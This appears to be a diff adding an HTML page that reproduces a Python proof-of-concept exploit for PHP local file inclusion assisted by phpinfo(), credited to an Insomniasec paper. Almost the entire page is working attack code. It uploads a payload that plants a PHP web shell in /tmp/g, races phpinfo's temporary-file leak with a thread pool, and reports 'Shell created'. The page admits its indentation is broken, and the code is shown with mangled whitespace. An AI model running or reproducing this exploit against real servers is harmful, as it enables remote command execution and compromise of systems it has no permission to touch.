@@ -1,0 +1,189 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>PoC</title>
+</head><body>This is PoC code and should be reviewed or updated with a newer version. From: <a href="https://web.archive.org/web/20130510204934/http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf">Insomniasec</a><br/>
+Needless to say, the spacing/indentation is broke and needs to be fixed.<br/>
+<br/>
+#!/usr/bin/python<br/>
+import sys<br/>
+import threading<br/>
+import socket<br/>
+<br/>
+def setup(host, port):<br/>
+TAG=&quot;Security Test&quot;<br/>
+PAYLOAD=&quot;&quot;&quot;%s\r<br/>
+&lt;?php $c=fopen('/tmp/g','w');fwrite($c,'&lt;?php passthru($_GET[&quot;f&quot;]);?&gt;');?&gt;\r&quot;&quot;&quot; % TAG<br/>
+REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r<br/>
+Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r<br/>
+Content-Type: text/plain\r<br/>
+\r<br/>
+%s<br/>
+-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD<br/>
+padding=&quot;A&quot; * 5000<br/>
+REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r<br/>
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r<br/>
+HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r<br/>
+HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r<br/>
+HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r<br/>
+HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r<br/>
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r<br/>
+Content-Length: %s\r<br/>
+Host: %s\r<br/>
+\r<br/>
+%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)<br/>
+#modify this to suit the LFI script<br/>
+LFIREQ=&quot;&quot;&quot;GET /lfi.php?load=%s%%00 HTTP/1.1\r<br/>
+User-Agent: Mozilla/4.0\r<br/>
+Proxy-Connection: Keep-Alive\r<br/>
+Host: %s\r<br/>
+\r<br/>
+\r<br/>
+&quot;&quot;&quot;<br/>
+return (REQ1, TAG, LFIREQ)<br/>
+<br/>
+def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):<br/>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br/>
+s.connect((host, port))<br/>
+s2.connect((host, port))<br/>
+s.send(phpinforeq)<br/>
+d = &quot;&quot;<br/>
+while len(d) &lt; offset:<br/>
+ d += s.recv(offset)<br/>
+try:<br/>
+ i = d.index(&quot;[tmp_name] =&amp;gt&quot;)<br/>
+ fn = d[i+17:i+31]<br/>
+except ValueError:<br/>
+ return None<br/>
+s2.send(lfireq % (fn, host))<br/>
+d = s2.recv(4096)<br/>
+s.close()<br/>
+s2.close()<br/>
+<br/>
+if d.find(tag) != -1:<br/>
+ return fn<br/>
+ <br/>
+counter=0<br/>
+class ThreadWorker(threading.Thread):<br/>
+def __init__(self, e, l, m, *args):<br/>
+ threading.Thread.__init__(self)<br/>
+ self.event = e<br/>
+ self.lock = l<br/>
+ self.maxattempts = m<br/>
+ self.args = args<br/>
+<br/>
+def run(self):<br/>
+ global counter<br/>
+ while not self.event.is_set():<br/>
+ with self.lock:<br/>
+  if counter &gt;= self.maxattempts:<br/>
+  return<br/>
+  counter+=1<br/>
+ try:<br/>
+  x = phpInfoLFI(*self.args)<br/>
+  if self.event.is_set():<br/>
+  break<br/>
+  if x:<br/>
+  print &quot;\nGot it! Shell created in /tmp/g&quot;<br/>
+  self.event.set()<br/>
+<br/>
+ except socket.error:<br/>
+  return<br/>
+<br/>
+def getOffset(host, port, phpinforeq):<br/>
+&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;<br/>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+s.connect((host,port))<br/>
+s.send(phpinforeq)<br/>
+<br/>
+d = &quot;&quot;<br/>
+while True:<br/>
+ i = s.recv(4096)<br/>
+ d+=i<br/>
+ if i == &quot;&quot;:<br/>
+ break<br/>
+ # detect the final chunk<br/>
+ if i.endswith(&quot;0\r\n\r\n&quot;):<br/>
+ break<br/>
+s.close()<br/>
+i = d.find(&quot;[tmp_name] =&amp;gt&quot;)<br/>
+if i == -1:<br/>
+ raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)<br/>
+<br/>
+print &quot;found %s at %i&quot; % (d[i:i+10],i)<br/>
+# padded up a bit<br/>
+return i+256<br/>
+<br/>
+def main():<br/>
+print &quot;LFI With PHPInfo()&quot;<br/>
+print &quot;-=&quot; * 30<br/>
+if len(sys.argv) &lt; 2:<br/>
+ print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]<br/>
+ sys.exit(1)<br/>
+try:<br/>
+ host = socket.gethostbyname(sys.argv[1])<br/>
+except socket.error, e:<br/>
+ print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)<br/>
+ sys.exit(1)<br/>
+<br/>
+ port=80<br/>
+try:<br/>
+port = int(sys.argv[2])<br/>
+except IndexError:<br/>
+pass<br/>
+except ValueError, e:<br/>
+print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)<br/>
+sys.exit(1)<br/>
+<br/>
+poolsz=10<br/>
+try:<br/>
+ poolsz = int(sys.argv[3])<br/>
+except IndexError:<br/>
+ pass<br/>
+except ValueError, e:<br/>
+ print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)<br/>
+ sys.exit(1)<br/>
+<br/>
+print &quot;Getting initial offset...&quot;,<br/>
+reqphp, tag, reqlfi = setup(host, port)<br/>
+offset = getOffset(host, port, reqphp)<br/>
+sys.stdout.flush()<br/>
+<br/>
+maxattempts = 1000<br/>
+e = threading.Event()<br/>
+l = threading.Lock()<br/>
+<br/>
+print &quot;Spawning worker pool (%d)...&quot; % poolsz<br/>
+sys.stdout.flush()<br/>
+<br/>
+tp = []<br/>
+for i in range(0,poolsz):<br/>
+ tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))<br/>
+ <br/>
+for t in tp:<br/>
+ t.start()<br/>
+try:<br/>
+ while not e.wait(1):<br/>
+ if e.is_set():<br/>
+  break<br/>
+ with l:<br/>
+  sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))<br/>
+  sys.stdout.flush()<br/>
+  if counter &gt;= maxattempts:<br/>
+  break<br/>
+ print<br/>
+ if e.is_set():<br/>
+ print &quot;Woot! \m/&quot;<br/>
+ else:<br/>
+ print &quot;:(&quot;<br/>
+except KeyboardInterrupt:<br/>
+ print &quot;\nTelling threads to shutdown...&quot;<br/>
+ e.set()<br/>
+<br/>
+print &quot;Shuttin' down...&quot;<br/>
+for t in tp:<br/>
+ t.join()<br/>
+if __name__==&quot;__main__&quot;:<br/>
+main()<br/>
+</body></html>
